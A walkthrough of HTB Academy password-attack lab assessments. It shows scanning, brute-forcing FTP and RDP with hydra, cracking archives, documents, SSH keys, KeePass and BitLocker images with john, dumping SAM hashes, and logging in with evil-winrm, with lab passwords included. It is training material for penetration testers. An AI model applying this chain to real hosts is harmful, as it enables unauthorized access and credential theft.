# SKILLS ASSESSEMENT

## <mark style="color:red;">Lab - Easy</mark>

First, let's initiate an IP scan to identify open ports, thereby enabling us to assess available options.

<figure><img src="../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>

I discovered that ports 21 and 22 are open. Let's attempt a brute force attack; perhaps we can obtain valid credentials.

<figure><img src="../.gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>

I discovered valid credentials while brute-forcing FTP. Let's attempt to log in using FTP and explore the available data.

<figure><img src="../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>

Upon logging in, I discovered a private key named id\_rsa. Let's proceed by transferring it to our machine and adjusting its permissions in an attempt to establish an SSH connection.

<figure><img src="../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>

Upon logging in, I conducted enumeration and successfully discovered the root password.

<figure><img src="../.gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:red;">Lab - Medium</mark>

Hello, everyone. Today, we will be exploring the Medium-level Password Attacks Walkthrough lab from the HTB Academy Penetration Testing Course. Our goal is to obtain the contents of flag.txt in /root/ .

First, we will perform an IP scan to identify open ports and assess the available options.

```
nmap -sC -sV 10.129.223.102
```

<figure><img src="../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>

We have three open ports (22, 139, 445). Let's list the shared resources available on the server.

```
smbclient -N -L \\\\10.129.223.102\\
```

<figure><img src="../.gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>

Let's review the contents of the SHAREDRIVE share.

```
smbclient //10.129.223.102/SHAREDRIVE
```

<figure><img src="../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>

First, let's apply the rules from `custom.rule` to each word in `password.list` and save the modified versions in `mut_password.list`.

```
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

Next, let's extract any useful information from the "Docs.zip" file obtained from the SMB server.

<figure><img src="../.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>

```
zip2john Docs.zip > zip.hash
john --wordlist=mut_password.list zip.hash
```

We have obtained the password for the file "Docs.zip." Let's use it to extract the contents.

```
unzip Docs.zip
```

<figure><img src="../.gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>

I've received a file named Documentation.docx. Let's examine it to determine the information it contains.

I attempted to open the file, but it is password-protected. Let's proceed with cracking it.

```
/usr/share/john/office2john.py Documentation.docx > docs.hash
john --wordlist=mut_password.list docs.hash
```

<figure><img src="../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>

We now have the password. Let's proceed by opening the Documentation.docx file to review its contents.

![](https://faresbltagy.gitbook.io/~gitbook/image?url=https%3A%2F%2F2537271824-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIswWWP3l0rGuQmG2WUcr%252Fuploads%252FCscVofZUXQlzOrwWwB62%252FScreenshot%287%29.png%3Falt%3Dmedia%26token%3D998b26f3-0b39-4826-a260-40c70fcc79c2\&width=768\&dpr=4\&quality=100\&sign=d228ac4a\&sv=2)

We have obtained the password for the username "jason." Let's proceed with attempting to connect via SSH using these credentials.

```
ssh jason@10.129.223.102
```

![](https://faresbltagy.gitbook.io/~gitbook/image?url=https%3A%2F%2F2537271824-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIswWWP3l0rGuQmG2WUcr%252Fuploads%252FIWvVQEUdWIJ0B3HvRA4s%252FScreenshot%288%29.png%3Falt%3Dmedia%26token%3D7f9fde17-68cb-4da4-84ea-f9841a614dd0\&width=768\&dpr=4\&quality=100\&sign=1b36511b\&sv=2)

We have successfully established an SSH connection using the user account "jason".

I investigated and found that port 3306 is open, which is the default port for MySQL. Let's attempt to connect to the MySQL server using Jason's credentials again.

<figure><img src="../.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>

```
mysql -ujason -p
```

![](https://faresbltagy.gitbook.io/~gitbook/image?url=https%3A%2F%2F2537271824-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIswWWP3l0rGuQmG2WUcr%252Fuploads%252FK1RRcj9pr2ZCP1nI7f6p%252FScreenshot%2810%29.png%3Falt%3Dmedia%26token%3De3b60f5a-3107-4da9-a40f-da23dd55c9c4\&width=768\&dpr=4\&quality=100\&sign=7dee39ec\&sv=2)

Let's analyze the database to determine what information we can extract.

```
show databases;
use users;
show tables;
select * from creds where name = 'dennis';
```

![](https://faresbltagy.gitbook.io/~gitbook/image?url=https%3A%2F%2F2537271824-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIswWWP3l0rGuQmG2WUcr%252Fuploads%252Fd9N5TFMvFikXCfzxPPNi%252FScreenshot%2812%29.png%3Falt%3Dmedia%26token%3D1b06ce40-d667-4e7c-9e08-77ae3549162b\&width=768\&dpr=4\&quality=100\&sign=d3e289ab\&sv=2)

During the investigation, I discovered an additional username, "dennis," and obtained the associated password from the MySQL server.

Let's use these credentials to log in as the user "dennis".

```
su dennis
```

![](https://faresbltagy.gitbook.io/~gitbook/image?url=https%3A%2F%2F2537271824-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIswWWP3l0rGuQmG2WUcr%252Fuploads%252Fb6hSeAXyL2lNV51nYJ3q%252FScreenshot%2813%29.png%3Falt%3Dmedia%26token%3Dc8c2a95c-ca1b-4097-89df-fe3d6043c5c1\&width=768\&dpr=4\&quality=100\&sign=600dee90\&sv=2)

I conducted an extensive investigation to locate the flag and discovered a hint indicating that useful files might be available in the home directory of one of the users.

Let's proceed by obtaining the SSH key for the user Dennis.

```
cd .ssh
cat id_rsa
```

![](https://faresbltagy.gitbook.io/~gitbook/image?url=https%3A%2F%2F2537271824-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIswWWP3l0rGuQmG2WUcr%252Fuploads%252FOYE6T9GOpymF4gGdvB3j%252FScreenshot%2814%29.png%3Falt%3Dmedia%26token%3Dd7445181-8692-4b17-883d-97493a25db85\&width=768\&dpr=4\&quality=100\&sign=7c21b331\&sv=2)

Let's copy the content of `id_rsa` to a file in our attacking machine and adjust its permissions to enable its use. Before doing so, let's extract the password first.

```
nano id_rsa
ssh2john id_rsa > ssh.hash
```

![](https://faresbltagy.gitbook.io/~gitbook/image?url=https%3A%2F%2F2537271824-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIswWWP3l0rGuQmG2WUcr%252Fuploads%252FI77qTUO9ZKZ6l9oojRzq%252FScreenshot%2815%29.png%3Falt%3Dmedia%26token%3D48a09bb6-53a5-44ca-b1c2-ea6222c312d0\&width=768\&dpr=4\&quality=100\&sign=dcf572a3\&sv=2)

First we extracted the hash from the SSH private key file (`id_rsa`) so that it can be cracked using the John the Ripper.

```
john --wordlist=mut_password.list  ssh.hash
```

![](https://faresbltagy.gitbook.io/~gitbook/image?url=https%3A%2F%2F2537271824-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIswWWP3l0rGuQmG2WUcr%252Fuploads%252FiYQyDu9Oot7fyCkwCiJW%252FScreenshot%2816%29.png%3Falt%3Dmedia%26token%3Df09e537c-b6e6-4bcf-93b3-69b07c68ed5c\&width=768\&dpr=4\&quality=100\&sign=5c235a32\&sv=2)

Here we have obtained the password. Let's update the file permissions and use the file with root access to verify if this solution works.

```
ssh -i id_rsa root@10.129.223.102
```

![](https://faresbltagy.gitbook.io/~gitbook/image?url=https%3A%2F%2F2537271824-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIswWWP3l0rGuQmG2WUcr%252Fuploads%252FHjIf1z5NlQTpJljdvbWZ%252FScreenshot%2817%29.png%3Falt%3Dmedia%26token%3D89625627-e6f5-4caf-8d42-da2b6c70f1f8\&width=768\&dpr=4\&quality=100\&sign=147a3e6c\&sv=2)

***

## <mark style="color:red;">Lab - Hard</mark>

The next host is a Windows-based client. As with the previous assessments, our client would like to make sure that an attacker cannot gain access to any sensitive files in the event of a successful attack. While our colleagues were busy with other hosts on the network, we found out that the user **`Johanna`** is present on many hosts. However, we have not yet been able to determine the exact purpose or reason for this.

Given that the user **Johanna** appears on multiple hosts, we should proceed with attempting to crack her password.

The host is a Windows-based client, so we will proceed with cracking using the RDP protocol.

```
hydra -l johanna -P mut_password.list rdp://10.129.211.174
```

<figure><img src="../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>

We have obtained the password for the user Johanna. Let's proceed with logging in using these credentials.

evil-winrm -i 10.129.211.174 -u johanna -p 1231234!

<figure><img src="../.gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>

We have successfully logged in. Let's proceed with the next steps.

```
download "C:/Users/johanna/Documents/Logins.kdbx" /home/htb-ac-1224655/Logins.kdbx
```

<figure><img src="../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

I located a file named Logins.kdbx and subsequently downloaded it to my analysis workstation.

The file is password-protected. Therefore, we should attempt to extract the password hash from this KeePass database file.

```
eepass2john Logins.kdbx > keys.hash
john --wordlist=mut_password.list keys.hash
```

<figure><img src="../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>

Now let's open the Logins.kdbx file using keepassxc.

![](https://faresbltagy.gitbook.io/~gitbook/image?url=https%3A%2F%2F2537271824-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIswWWP3l0rGuQmG2WUcr%252Fuploads%252FjGHGtWEqGjG4CmB1StxI%252FScreenshot%2822%29.png%3Falt%3Dmedia%26token%3D31a84e73-7bc5-41c6-be0a-103162e41957\&width=768\&dpr=4\&quality=100\&sign=1c6a8e9d\&sv=2)

I discovered credentials for the user "david."

![](https://faresbltagy.gitbook.io/~gitbook/image?url=https%3A%2F%2F2537271824-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIswWWP3l0rGuQmG2WUcr%252Fuploads%252FZpMCo7kgwOdUWpubstNd%252FScreenshot%2823%29.png%3Falt%3Dmedia%26token%3D62d0e022-0fec-44e3-80c4-4bca1ca0d2d7\&width=768\&dpr=4\&quality=100\&sign=5889f291\&sv=2)

After a while, I used `smbclient` with David's credentials to assess the available resources.

```
smbclient -U david //10.129.211.174/david
```

There is a virtual hard disk named Backup.vhd. let's transfer it to our attacking machine.

![](https://faresbltagy.gitbook.io/~gitbook/image?url=https%3A%2F%2F2537271824-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIswWWP3l0rGuQmG2WUcr%252Fuploads%252FfT9yvDJzd73grcXELWTn%252FScreenshot%2824%29.png%3Falt%3Dmedia%26token%3D189f01fa-a60a-4290-9087-d59ad7bc8339\&width=768\&dpr=4\&quality=100\&sign=9ac02acb\&sv=2)

It's an encrypted virtual hard disk. Let's proceed with the decryption process.

[Bit-locker encrypted vhd files in LinuxMedium](https://medium.com/@kartik.sharma522/mounting-bit-locker-encrypted-vhd-files-in-linux-4b3f543251f0)

Let's extract the BitLocker recovery information from the VHD file and format it into a hash that can be used for password cracking with John the Ripper.

```
bitlocker2john -i Backup.vhd > backup.hashes
```

<figure><img src="../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>

```
grep "bitlocker\$0" backup.hashes > backup.hash
john --wordlist=mut_password.list backup.hash
```

<figure><img src="../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>

```
sudo mkdir /media/backup_bitlocker /media/mount
sudo losetup -P /dev/loop100 Backup.vhd
```

<figure><img src="../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>

```
sudo dislocker -v -V /dev/loop100p2 -u -- /media/backup_bitlocker
sudo mount -o loop,rw /media/backup_bitlocker/dislocker-file /media/mount
ls -la /media/mount
```

![](https://faresbltagy.gitbook.io/~gitbook/image?url=https%3A%2F%2F2537271824-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIswWWP3l0rGuQmG2WUcr%252Fuploads%252FiHa0UQHOxF3OdJR8bgWf%252FScreenshot%2828%29.png%3Falt%3Dmedia%26token%3D9a918a10-0fb4-42bb-b400-92cb672f6df6\&width=768\&dpr=4\&quality=100\&sign=105b4d84\&sv=2)

```
sudo cp /media/mount/SAM /root
sudo cp /media/mount/SYSTEM /root
```

![](https://faresbltagy.gitbook.io/~gitbook/image?url=https%3A%2F%2F2537271824-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIswWWP3l0rGuQmG2WUcr%252Fuploads%252FKASjzxeE4yxp4K2y3cpf%252FScreenshot%2830%29.png%3Falt%3Dmedia%26token%3D312b2dc8-ad71-4e63-9489-e0284e6e7a5c\&width=768\&dpr=4\&quality=100\&sign=ae80a08a\&sv=2)

Here, we can see the NT hash for the Administrator account.

<figure><img src="../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>

Let's save the file and attempt to crack it using John the Ripper.

```
john --format=NT --wordlist=mut_password.list admin.hash
```

![](https://faresbltagy.gitbook.io/~gitbook/image?url=https%3A%2F%2F2537271824-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIswWWP3l0rGuQmG2WUcr%252Fuploads%252F7pmGT8Ty4qxQq4fhkim2%252FScreenshot%2833%29.png%3Falt%3Dmedia%26token%3D4d4bf3c5-6768-4fed-b760-b987a0719c37\&width=768\&dpr=4\&quality=100\&sign=2df764b1\&sv=2)

We now have the password. Let's proceed with connecting using these credentials.

```
evil-winrm -i 10.129.211.174 -u administrator -p Liverp00l8!
```

![](https://faresbltagy.gitbook.io/~gitbook/image?url=https%3A%2F%2F2537271824-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIswWWP3l0rGuQmG2WUcr%252Fuploads%252FZhDONFWQiBKfT4kzTG4e%252FScreenshot%2834%29.png%3Falt%3Dmedia%26token%3D0d597ed4-640a-4332-9ccc-84ec45cb8844\&width=768\&dpr=4\&quality=100\&sign=7a8cb4a\&sv=2)

Now we can get the flag.
